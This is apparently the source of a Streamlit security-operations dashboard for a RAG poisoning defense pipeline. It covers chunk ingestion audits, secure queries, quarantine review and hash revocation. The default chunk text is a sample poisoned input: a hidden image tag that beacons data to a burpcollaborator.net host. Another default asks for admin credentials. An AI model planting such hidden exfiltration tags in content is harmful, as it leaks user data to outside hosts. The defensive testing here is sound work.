import streamlit as st
import pandas as pd
import sys
from pathlib import Path

# Add project root to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent.parent))

st.set_page_config(page_title="Retrivance SOC Dashboard", layout="wide")

st.title("🛡️ Retrivance: Security Operations Console")
st.markdown("Real-time scanning, quarantine management, and poisoned retrieval defense.")

# Lazy import and initialization
@st.cache_resource
def get_pipeline():
    try:
        from ragsentinel.pipeline.sentinel_rag import SentinelRAGPipeline
        return SentinelRAGPipeline()
    except Exception as e:
        st.error(f"Failed to initialize pipeline: {str(e)}")
        st.info("Please ensure all dependencies are installed and ChromaDB is properly configured.")
        return None

# Initialize pipeline
pipeline = get_pipeline()

if pipeline is None:
    st.warning("Dashboard running in limited mode without full pipeline initialization.")
    st.info("Check the logs for error details.")

tabs = st.tabs(["Ingest Inspector", "Query Security & Counterfactual", "Quarantine Review"])

with tabs[0]:
    st.subheader("Manual Document Ingestion Audit")
    doc_text = st.text_area("Chunk Content", height=150, value="Click here to verify: <img src='https://burpcollaborator.net/telemetry?data=123' style='display:none;' />")
    author = st.text_input("Author ID", value="analyst@enterprise.internal")

    if st.button("Audit and Ingest Chunk"):
        if pipeline is None:
            st.error("Pipeline not initialized. Cannot perform ingestion.")
        else:
            from ragsentinel.models.schemas import Chunk, ChunkMetadata
            cid = f"test-{hash(doc_text)}"
            sha = pipeline.provenance.compute_sha256(doc_text)
            chunk = Chunk(
                text=doc_text,
                metadata=ChunkMetadata(
                    chunk_id=cid,
                    document_id="manual-doc",
                    author_id=author,
                    sha256_hash=sha
                )
            )
            results = pipeline.secure_ingest([chunk])
            res = results[0]

            if res.verdict == "QUARANTINE":
                st.error(f"VERDICT: {res.verdict} (Risk: {res.composite_risk:.2f})")
            elif res.verdict == "FLAG":
                st.warning(f"VERDICT: {res.verdict} (Risk: {res.composite_risk:.2f})")
            else:
                st.success(f"VERDICT: {res.verdict} (Risk: {res.composite_risk:.2f})")

            st.json(res.model_dump())

with tabs[1]:
    st.subheader("Query Pipeline & Influence Engine")
    query_input = st.text_input("Inquiry", value="What are the default system admin credentials?")

    if st.button("Execute Safe Retrieval"):
        if pipeline is None:
            st.error("Pipeline not initialized. Cannot execute query.")
        else:
            answer, audit_log = pipeline.secure_query(query_input)

            st.markdown("### Generated Response")
            st.info(answer)

            st.markdown("### Security Audit Trail")
            if audit_log:
                for log in audit_log:
                    st.write(f"- `{log}`")
            else:
                st.write("No anomalous behavior detected during retrieval.")

with tabs[2]:
    st.subheader("Quarantine Management")
    st.markdown("Review and approve/reject quarantined chunks.")

    if st.button("Refresh Quarantine List"):
        st.rerun()

    if pipeline is None:
        st.warning("Pipeline not initialized. Cannot access quarantine.")
    else:
        pending_chunks = pipeline.quarantine.get_pending_chunks()

        if not pending_chunks:
            st.info("No pending quarantined chunks.")
        else:
            st.write(f"**{len(pending_chunks)} pending chunks**")

            for chunk in pending_chunks:
                with st.expander(f"Chunk: {chunk['chunk_id']} (Risk: {chunk['risk']:.2f})"):
                    st.write(f"**Author:** {chunk['author_id']}")
                    st.write(f"**Created:** {chunk['created_at']}")
                    st.write(f"**Reasons:** {', '.join(chunk['reasons'])}")
                    st.text_area("Content", chunk['text'], height=100, key=f"text_{chunk['chunk_id']}")

                    col1, col2 = st.columns(2)
                    with col1:
                        if st.button("Approve", key=f"approve_{chunk['chunk_id']}"):
                            reviewer = st.text_input("Reviewer ID", value="analyst", key=f"reviewer_{chunk['chunk_id']}")
                            if pipeline.quarantine.approve_chunk(chunk['chunk_id'], reviewer):
                                st.success(f"Approved {chunk['chunk_id']}")
                                st.rerun()
                    with col2:
                        if st.button("Reject", key=f"reject_{chunk['chunk_id']}"):
                            reviewer = st.text_input("Reviewer ID", value="analyst", key=f"reviewer_reject_{chunk['chunk_id']}")
                            if pipeline.quarantine.reject_chunk(chunk['chunk_id'], reviewer):
                                st.success(f"Rejected {chunk['chunk_id']}")
                                st.rerun()

    st.subheader("Provenance & Revocation Registry")
    st.markdown("Direct access to the cryptographically signed ledger.")
    chunk_to_revoke = st.text_input("Chunk ID to revoke")
    if st.button("Revoke Chunk Hash"):
        if pipeline is None:
            st.error("Pipeline not initialized. Cannot revoke chunk.")
        else:
            pipeline.provenance.revoke_chunk(chunk_to_revoke)
            st.success(f"Chunk {chunk_to_revoke} has been permanently revoked.")


def main():
    pass
